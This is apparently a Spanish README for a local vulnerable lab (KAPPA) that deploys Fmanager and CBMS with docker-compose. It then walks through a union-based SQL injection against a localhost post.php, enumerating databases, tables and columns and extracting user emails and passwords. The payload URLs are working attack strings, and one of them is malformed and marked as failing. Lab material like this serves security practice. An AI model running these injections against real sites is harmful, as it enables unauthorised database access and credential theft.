# KAPPA

- IIS (port 80): Fmanager
- XAMPP (port 8000): CBMS

## Despliegue

1. Ejecutar `docker-compose build` para construir el env.
2. Ejecutar `docker-compose up -d` para levantar el contenedor.

## Explotación SQLi

Obtener version y base de datos actual:
- `http://localhost:8188/post.php?id=0%27%20union%20select%201,2,version(),database(),5%20--%20-`

Obtener tablas de la base de datos actual:
- `http://localhost:8188/post.php?id=0%27%20union%20select%201,2,version(),table_name,5%20from%20information_schema.tables%20where%20table_schema=database()%20--%20-`

Obtener nombres de las columnas de la tabla 'users':
- `http://localhost:8188/post.php?id=0%27%20union%20select%201%2C2%2Cversion%28%29%2Ccolumn_name%2C5%20from%20information_schema.columns%20where%20table_name%3D%27users%27%20--%20-`

Obtener los valores de las columnas 'id', 'email' y 'password' de la tabla 'users':
- `http://localhost:8188/post.php?id=0%27%20union%20select%201%2Cid%2Cemail%2Cpassword%2C5%20from%20users%20--%20-`

Intentando obtener el valor de la columna 'pass' de la tabla 'users' (pero sin éxito):
- `http://localhost:8188/post.php?id=0%27%20union%20select%201%2Cid%2Cemail%pass%2C5%20from%20users%20--%20-`

Ver bases de datos:
- `http://localhost:8188/post.php?id=0%27%20union%20select%201%2C2%2C3%2Cschema_name%2C5%20from%20information_schema.schemata%20--%20-`

Obtener tablas de la base de datos 'fmanager':
- `http://localhost:8188/post.php?id=0%27%20union%20select%201,2,version(),table_name,5%20from%20information_schema.tables%20where%20table_schema=%27fmanager%27%20--%20-`

Obtener nombres de las columnas de la tabla 'users' de la base de datos 'fmanager':
- `http://localhost:8188/post.php?id=0%27%20union%20select%201%2C2%2Cversion%28%29%2Ccolumn_name%2C5%20from%20information_schema.columns%20where%20table_name%3D%27users%27%20and%20table_schema%3D%27fmanager%27%20--%20-`

Obtener valores de las columnas 'id', 'email' y 'pass' de la tabla 'users' de la base de datos 'fmanager':
- `http://localhost:8188/post.php?id=0%27%20union%20select%201%2C2%2Cid%2Cemail%2Cpass%20from%20fmanager.users%20--%20-`

